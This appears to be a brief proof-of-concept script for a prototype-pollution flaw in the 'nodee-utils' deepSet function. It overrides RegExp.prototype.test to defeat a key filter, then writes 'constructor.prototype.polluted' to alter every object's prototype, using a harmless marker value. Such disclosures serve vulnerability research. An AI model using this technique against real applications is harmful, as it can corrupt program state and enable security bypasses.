RegExp.prototype.test = () => true;
const {object} = require('nodee-utils');
var obj = {};
console.log({}.polluted);
object.deepSet({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);